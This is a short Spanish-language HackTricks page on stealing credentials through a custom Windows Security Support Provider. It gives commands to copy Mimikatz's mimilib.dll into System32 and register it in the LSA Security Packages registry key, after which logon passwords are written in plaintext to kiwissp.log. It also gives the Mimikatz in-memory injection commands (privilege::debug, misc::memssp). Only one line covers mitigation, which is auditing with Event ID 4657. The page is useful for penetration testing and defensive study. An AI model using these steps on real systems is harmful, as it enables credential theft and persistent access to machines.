# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Aprende qué es un SSP (Security Support Provider) aquí.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar** en **texto plano** las **credenciales** utilizadas para acceder a la máquina.

#### Mimilib

Puedes utilizar el binario `mimilib.dll` proporcionado por Mimikatz. **Esto registrará en un archivo todas las credenciales en texto plano.**\
Copia la DLL en `C:\Windows\System32\`\
Obtén una lista de los Paquetes de seguridad LSA existentes:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Añade `mimilib.dll` a la lista de Security Support Provider (Security Packages):
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Y después de un reinicio, todas las credenciales se pueden encontrar en texto claro en `C:\Windows\System32\kiwissp.log`

#### En memoria

También puedes inyectarlo directamente en memoria usando Mimikatz (ten en cuenta que podría ser un poco inestable/no funcionar):
```bash
privilege::debug
misc::memssp
```
Esto no sobrevivirá a los reinicios.

#### Mitigación

Event ID 4657 - Auditar la creación/cambio de `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
